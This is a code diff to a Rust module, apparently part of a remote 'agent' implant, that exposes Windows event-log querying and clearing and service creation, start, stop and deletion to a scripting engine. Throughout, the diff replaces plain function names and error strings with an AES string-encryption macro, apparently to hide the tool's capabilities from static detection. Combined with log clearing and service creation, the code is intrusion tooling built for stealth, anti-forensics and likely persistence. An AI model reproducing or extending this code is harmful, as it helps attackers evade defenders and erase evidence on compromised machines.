@@ -1,5 +1,7 @@
 // src/agent/scripting/winext.rs
 use rhai::Engine;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
@@ -10,7 +12,7 @@ pub fn register(engine: &mut Engine) {
     // xpath: XPath filter string, e.g. "*[System[EventID=4624]]" or "*"
     // max: maximum number of events to return (capped at 500)
     // Returns JSON array of raw XML event strings.
-    engine.register_fn("internal_eventlog_query", |log_name: &str, xpath: &str, max: i64| -> String {
+    engine.register_fn(&aes_str!("internal_eventlog_query"), |log_name: &str, xpath: &str, max: i64| -> String {
         #[cfg(target_os = "windows")]
         {
             use super::win_ffi::evtlog_ext::*;
@@ -24,7 +26,7 @@ pub fn register(engine: &mut Engine) {
                     query.as_ptr(),
                     EVT_QUERY_CHANNEL_PATH | EVT_QUERY_REVERSE_DIRECTION,
                 );
-                if h_query.is_null() { return "Error: EvtQuery failed".into(); }
+                if h_query.is_null() { return aes_str!("Error: EvtQuery failed"); }
                 let mut events = Vec::new();
                 let mut batch  = [std::ptr::null_mut::<std::ffi::c_void>(); 10];
                 let mut returned: u32 = 0;
@@ -47,7 +49,7 @@ pub fn register(engine: &mut Engine) {
     });
 
     // Clear a Windows Event Log channel (requires admin).
-    engine.register_fn("internal_eventlog_clear", |log_name: &str| -> String {
+    engine.register_fn(&aes_str!("internal_eventlog_clear"), |log_name: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use super::win_ffi::evtlog_ext::*;
@@ -60,7 +62,7 @@ pub fn register(engine: &mut Engine) {
                     0,
                 );
                 if ok != 0 { format!("Cleared: {}", log_name) }
-                else { "Error: EvtClearLog failed (check admin rights)".into() }
+                else { aes_str!("Error: EvtClearLog failed (check admin rights)") }
             }
         }
         #[cfg(not(target_os = "windows"))]
@@ -70,13 +72,13 @@ pub fn register(engine: &mut Engine) {
     // ── Windows Services ──────────────────────────────────────────────────────
 
     // Enumerate all services - returns JSON array of {name, display_name, state, pid}.
-    engine.register_fn("internal_service_enum", || -> String {
+    engine.register_fn(&aes_str!("internal_service_enum"), || -> String {
         #[cfg(target_os = "windows")]
         {
             use super::win_ffi::svc_ext::*;
             unsafe {
                 let h_scm = OpenSCManagerA(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
-                if h_scm.is_null() { return "Error: OpenSCManager failed".into(); }
+                if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let mut bytes_needed: DWORD = 0;
                 let mut returned:     DWORD = 0;
                 let mut resume:       DWORD = 0;
@@ -90,46 +92,46 @@ pub fn register(engine: &mut Engine) {
                     SERVICE_STATE_ALL, buf.as_mut_ptr(), buf.len() as DWORD,
                     &mut bytes_needed, &mut returned, &mut resume, std::ptr::null());
                 CloseServiceHandle(h_scm);
-                if ok == 0 { return "Error: EnumServicesStatusEx failed".into(); }
+                if ok == 0 { return aes_str!("Error: EnumServicesStatusEx failed"); }
                 // Parse the variable-length ENUM_SERVICE_STATUS_PROCESS array.
                 let services = parse_service_list(&buf, returned);
                 serde_json::to_string(&services).unwrap_or("[]".into())
             }
         }
         #[cfg(not(target_os = "windows"))]
-        "Error: service_enum is Windows only".into()
+        aes_str!("Error: service_enum is Windows only")
     });
 
-    engine.register_fn("internal_service_start", |name: &str| -> String {
+    engine.register_fn(&aes_str!("internal_service_start"), |name: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             use super::win_ffi::svc_ext::*;
-            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return "Error: invalid name".into() };
+            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
             unsafe {
                 let h_scm = OpenSCManagerA(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
-                if h_scm.is_null() { return "Error: OpenSCManager failed".into(); }
+                if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
                 if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
                 let ok = StartServiceA(h_svc, 0, std::ptr::null());
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Started: {}", name) } else { "Error: StartService failed".into() }
+                if ok != 0 { format!("Started: {}", name) } else { aes_str!("Error: StartService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
         format!("Error: service_start is Windows only ({})", name)
     });
 
-    engine.register_fn("internal_service_stop", |name: &str| -> String {
+    engine.register_fn(&aes_str!("internal_service_stop"), |name: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             use super::win_ffi::svc_ext::*;
-            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return "Error: invalid name".into() };
+            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
             unsafe {
                 let h_scm = OpenSCManagerA(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
-                if h_scm.is_null() { return "Error: OpenSCManager failed".into(); }
+                if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
                 if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
@@ -139,25 +141,25 @@ pub fn register(engine: &mut Engine) {
                 };
                 let ok = ControlService(h_svc, SERVICE_CONTROL_STOP, &mut status);
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Stopped: {}", name) } else { "Error: ControlService failed".into() }
+                if ok != 0 { format!("Stopped: {}", name) } else { aes_str!("Error: ControlService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
         format!("Error: service_stop is Windows only ({})", name)
     });
 
-    engine.register_fn("internal_service_create", |name: &str, display: &str, binary_path: &str, auto_start: bool| -> String {
+    engine.register_fn(&aes_str!("internal_service_create"), |name: &str, display: &str, binary_path: &str, auto_start: bool| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             use super::win_ffi::svc_ext::*;
-            let cname    = match CString::new(name)        { Ok(s) => s, Err(_) => return "Error: invalid name".into() };
-            let cdisp    = match CString::new(display)     { Ok(s) => s, Err(_) => return "Error: invalid display".into() };
-            let cbin     = match CString::new(binary_path) { Ok(s) => s, Err(_) => return "Error: invalid path".into() };
+            let cname    = match CString::new(name)        { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
+            let cdisp    = match CString::new(display)     { Ok(s) => s, Err(_) => return aes_str!("Error: invalid display") };
+            let cbin     = match CString::new(binary_path) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid path") };
             let start_type = if auto_start { SERVICE_AUTO_START } else { SERVICE_DEMAND_START };
             unsafe {
                 let h_scm = OpenSCManagerA(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
-                if h_scm.is_null() { return "Error: OpenSCManager failed (admin required)".into(); }
+                if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed (admin required)"); }
                 let h_svc = CreateServiceA(
                     h_scm, cname.as_ptr(), cdisp.as_ptr(),
                     SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, start_type,
@@ -166,7 +168,7 @@ pub fn register(engine: &mut Engine) {
                     std::ptr::null(), std::ptr::null(),
                 );
                 CloseServiceHandle(h_scm);
-                if h_svc.is_null() { return "Error: CreateService failed".into(); }
+                if h_svc.is_null() { return aes_str!("Error: CreateService failed"); }
                 CloseServiceHandle(h_svc);
                 format!("Created service: {}", name)
             }
@@ -175,21 +177,21 @@ pub fn register(engine: &mut Engine) {
         format!("Error: service_create is Windows only ({})", name)
     });
 
-    engine.register_fn("internal_service_delete", |name: &str| -> String {
+    engine.register_fn(&aes_str!("internal_service_delete"), |name: &str| -> String {
         #[cfg(target_os = "windows")]
         {
             use std::ffi::CString;
             use super::win_ffi::svc_ext::*;
-            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return "Error: invalid name".into() };
+            let cname = match CString::new(name) { Ok(s) => s, Err(_) => return aes_str!("Error: invalid name") };
             unsafe {
                 let h_scm = OpenSCManagerA(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
-                if h_scm.is_null() { return "Error: OpenSCManager failed".into(); }
+                if h_scm.is_null() { return aes_str!("Error: OpenSCManager failed"); }
                 let h_svc = OpenServiceA(h_scm, cname.as_ptr(), SERVICE_ALL_ACCESS);
                 CloseServiceHandle(h_scm);
                 if h_svc.is_null() { return format!("Error: service '{}' not found", name); }
                 let ok = DeleteService(h_svc);
                 CloseServiceHandle(h_svc);
-                if ok != 0 { format!("Deleted: {}", name) } else { "Error: DeleteService failed".into() }
+                if ok != 0 { format!("Deleted: {}", name) } else { aes_str!("Error: DeleteService failed") }
             }
         }
         #[cfg(not(target_os = "windows"))]
